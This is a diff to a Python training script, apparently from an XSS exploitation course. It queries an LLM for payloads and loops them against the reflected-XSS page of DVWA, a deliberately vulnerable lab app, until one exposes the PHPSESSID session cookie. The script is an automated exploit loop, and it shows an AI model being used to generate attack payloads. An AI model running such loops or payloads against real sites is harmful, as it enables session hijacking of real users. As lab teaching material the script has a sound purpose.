@@ -19,9 +19,6 @@ class PointlessAI_introduction_to_xss_vulnerability_exploitation(DVWA_Session, C
         DVWA_Session.__init__(self)
         ChatGPT_Func.__init__(self) 
         General_Func.__init__(self)
-
-    def get_constants(self):
-        return self.login_url
     
     def identify_xss_injection_points(self, s, url):
         response = s.get(url)
@@ -32,7 +29,7 @@ class PointlessAI_introduction_to_xss_vulnerability_exploitation(DVWA_Session, C
             return ["Error accessing URL"]
 
     def craft_xss_payloads(self, s, context, history, xss_path):
-        xss_payload = self.red_team_query(f"Based on the provided {context} , generate a payload for the purpose of red team penetration testing. \
+        xss_payload = self.red_team_query(f"Based on the provided {context} , generate a payload to print the session id. \
                                             The following payloads have already been attempted and were unsuccesful: {history}", self.no_markdown)
         history.append(xss_payload)
         executed_return = self.attack_xss(s, xss_payload, xss_path)
@@ -43,9 +40,18 @@ class PointlessAI_introduction_to_xss_vulnerability_exploitation(DVWA_Session, C
             return 0
 
     def attack_xss(self, s, xss_payload_res, xss_path):
-        response = self.get_dvwa(s, self.base_url + f"{xss_path}/?name={xss_payload_res}")
-        if response.status_code == 200 and "<script>" in response.text:
-            # print(response.text)
+
+        phpsessid = s.cookies.get('PHPSESSID', None)
+        print(phpsessid)
+
+        url = f"{self.base_url}{xss_path}"
+        cookie_name = 'PHPSESSID'
+        cookie_value = phpsessid
+        url,response = self.selenium_test(f"{url}/?name={xss_payload_res}", cookie_name, cookie_value)
+        print(url)
+        print(response)
+        if "PHPSESSID" in response:
+            print(response)
             return xss_payload_res
         else:
             return 0
@@ -55,15 +61,14 @@ def main():
     with requests.Session() as s:
         user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.get_constants())
         _ = ai.login_to_dvwa(s, ai.get_constants(), 'admin', 'password', user_token)
-        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.base_url+"/setup.php")
-        _ = ai.setup_database(s, ai.base_url+"/setup.php", user_token, cookies)
 
         xss_path = "/vulnerabilities/xss_r"
 
+        # Uncomment to scan url for attack vectors
         vectors = ai.identify_xss_injection_points(s, f"{ai.base_url}{xss_path}/")
-        # print(vectors)
+        print(vectors)
 
-        # Failed exploits will be placed in history so they are not attempted again.
+        # Failed exploits are placed in history so they are not attempted again.
         history = []
         # Exploit the AI generated exploit
         exploit = ai.craft_xss_payloads(s, vectors, history, xss_path)
@@ -72,7 +77,7 @@ def main():
         # Craft new exploits until success
         while(True):
             if (exploit != 0):
-                print(f"XSS detected using {exploit}")
+                print(f"Session cookie found using: {exploit}")
                 break
             else:
                 exploit = ai.craft_xss_payloads(s, vectors, history, xss_path)
